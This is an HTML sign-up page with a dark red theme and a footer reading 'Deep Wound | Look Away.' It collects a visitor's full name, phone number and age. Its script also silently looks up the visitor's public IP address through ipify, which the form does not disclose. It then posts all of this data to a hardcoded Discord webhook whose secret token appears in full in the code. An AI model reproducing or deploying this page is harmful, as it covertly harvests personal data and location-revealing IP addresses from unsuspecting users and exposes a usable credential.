<!DOCTYPE html> 
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up</title>
    <link rel="stylesheet" href="style.css">
    <style>
        body {
            background: black;
            color: red;
            font-family: 'Courier New', monospace;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        h1 {
            font-size: 36px;
            margin-bottom: 30px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
        }

        .form-container {
            width: 400px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0px 8px 15px rgba(0, 0, 0, 0.6);
        }

        input[type="text"], input[type="tel"], input[type="number"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: black;
            color: red;
            border: 2px solid red;
            border-radius: 5px;
            font-size: 18px;
            font-family: 'Courier New', monospace;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.6);
        }

        input[type="text"]:focus, input[type="tel"]:focus, input[type="number"]:focus {
            outline: none;
            box-shadow: 0px 0px 15px rgba(255, 0, 0, 0.8);
        }

        button {
            background-color: #b00000;
            color: white;
            padding: 15px 40px;
            border: none;
            font-size: 24px;
            cursor: pointer;
            border-radius: 8px;
            box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.6);
            transition: background-color 0.3s, transform 0.2s;
        }

        button:hover {
            background-color: #8e0000;
            transform: translateY(-5px);
        }

        footer {
            position: absolute;
            bottom: 10px;
            width: 100%;
            font-size: 14px;
            text-align: center;
        }

    </style>
</head>
<body>

    <div class="form-container">
        <h1>Sign Up</h1>

        <form id="signupForm">
            <div>
                <label for="fullName">Full Name:</label><br>
                <input type="text" id="fullName" name="fullName" required><br><br>
            </div>
            <div>
                <label for="phoneNumber">Phone Number:</label><br>
                <input type="tel" id="phoneNumber" name="phoneNumber" required placeholder="123-456-7890" pattern="\d{3}[\-]\d{3}[\-]\d{4}"><br><br>
            </div>
            <div>
                <label for="age">Age:</label><br>
                <input type="number" id="age" name="age" required><br><br>
            </div>
            <button type="submit">Submit</button>
        </form>
    </div>

    <footer>
        <p>2025 | Deep Wound | Look Away.</p>
    </footer>

    <script>
        document.getElementById("signupForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const fullName = document.getElementById("fullName").value;
            const phoneNumber = document.getElementById("phoneNumber").value;
            const age = document.getElementById("age").value;

            if (!fullName || !phoneNumber || !age) {
                alert("Please fill in all fields!");
                return;
            }

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;

                    const webhookURL = "https://discord.com/api/webhooks/1347623002992541778/5bSzgCY5Ynr7_cZVk0q60XqkIeOsAlyp9ZwkaByqYAP39YQf7BqHdcxGzrkk6wR4OAiD";

                    const payload = {
                        content: "New Sign Up!",
                        embeds: [{
                            title: "New Sign Up Details",
                            fields: [
                                {
                                    name: "Full Name",
                                    value: fullName,
                                    inline: true
                                },
                                {
                                    name: "Phone Number",
                                    value: phoneNumber,
                                    inline: true
                                },
                                {
                                    name: "Age",
                                    value: age,
                                    inline: true
                                },
                                {
                                    name: "IP Address",
                                    value: userIP,
                                    inline: true
                                }
                            ]
                        }]
                    };

                    fetch(webhookURL, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (response.ok) {
                            alert("Sign up successful!");
                        } else {
                            alert("There was an error sending data.");
                        }
                    })
                    .catch(error => {
                        console.error("Error:", error);
                        alert("There was an error sending data.");
                    });
                });
        });
    </script>

</body>
</html>
